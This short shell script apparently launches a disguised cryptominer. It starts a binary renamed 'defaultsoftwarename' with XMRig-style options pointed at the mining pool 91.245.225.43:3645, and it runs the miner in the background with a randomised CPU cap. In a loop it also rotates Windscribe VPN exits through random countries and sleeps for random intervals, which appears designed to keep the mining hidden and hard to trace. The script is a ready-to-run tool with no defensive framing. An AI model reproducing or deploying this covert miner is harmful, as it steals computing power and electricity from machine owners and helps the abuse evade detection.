#!/bin/sh

echo "Start"
while (true) 
do
 CPU=$( shuf -i 55-85 -n 1 )
 TIM=$( shuf -i 180-298 -n 1 )
 cont_v=$(shuf -e US-C US US-M CA AT HR CY CZ DK FI FR GR HU IL IT MD NO PL GB ZA AU TR AU ID SG KR AR MX -n 1)
 
 sudo pkill defaultsoftwarename
 windscribe connect $cont_v
 defaultsoftwarename -o 91.245.225.43:3645 --rig-id=$ID -B -l /tmp/$tmpfoldername/log.log --donate-level=0 --print-time=40 --threads=defaultTHREADS --cpu-priority=4 --background --max-cpu-usage=$CPU --av=1 --variant -1
 echo -e 'ALL WORKS! tail -f /tmp/$tmpfoldername/log.log' $CPU $TIM
 sleep $TIM;
 windscribe disconnect
done;
